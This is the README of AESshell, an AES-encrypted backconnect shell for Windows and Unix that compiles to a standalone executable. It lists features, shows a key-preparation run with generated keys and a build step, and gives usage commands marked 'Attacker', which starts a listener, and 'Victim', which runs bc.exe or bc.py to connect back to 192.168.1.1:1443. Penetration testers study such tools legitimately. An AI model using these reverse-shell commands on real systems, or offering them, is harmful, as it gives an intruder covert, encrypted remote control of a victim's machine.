   _____  ___________ _________      .__           .__  .__   
  /  _  \ \_   _____//   _____/ _____|  |__   ____ |  | |  |  
 /  /_\  \ |    __)_ \_____  \ /  ___/  |  \_/ __ \|  | |  |  
/    |    \|        \/        \\___ \|   Y  \  ___/|  |_|  |__
\____|__  /_______  /_______  /____  >___|  /\___  >____/____/
        \/        \/        \/     \/     \/     \/           

Bright side
-----------
- python2.7 AES CBC Mode HMAC-SHA256 Backconnect Shell
- running on windows and unix (mac untested, works most probably)
- compiles with pyinstaller, so no python installation needed
- tries 10 times to connect back, quits afterwards
- windows binary provided

Preperation
-----------
Create a new package:
$ ./prepare.py 
[*] Copy bc.py to aesout/bc.py
[*] Copy listen.py to aesout/listen.py
[*] Copy aes.py to aesout/aes.py
[*] Copy bc.spec to aesout/bc.spec
[*] Copy MSVCP90.dll to aesout/MSVCP90.dll
[*] Copy MSVCR90.dll to aesout/MSVCR90.dll
[*] Copy done
[*] New Key: aQlfNwMbxcS7vH4lEShQgDdJ2GOL9NBjwOecrUGcLj++M2C4CrV9poQJ+0Bi3MdzqRCMCqMTCbI=
[*] Found old key: F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4=
[*] aesout/bc.py ready
[*] Found old key: F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4=
[*] aesout/listen.py ready
[*] Done

Build Exe:

C:\pyinstaller -F bc.spec

Test it:
C:\dist\bc.exe

Usage
-----

Attacker:
$ python listen.py 0.0.0.0 1443

Victim MS-Windows:
C:\bc.exe 192.168.1.1 1443

Victim *nix with python interpreter:
$ python bc.py 192.168.1.1 1443

Files
-----
aes.py 		- crypto import, needed by listen.py (integrated into bc.py)
bc.exe 		- compiled with pyinstaller for windows (Tested: WinXP/Win7/Win8)
bc.spec 	- spec file for pyinstaller
bc.py 		- the backconnect shell
listen.py 	- the listener shell
prepare.py	- prepares all *.py files with a new aes key and outputs it to aesout
MSV*		- windows dlls for pyinstaller


Author
------
Marco Lux <ping@curesec.com>
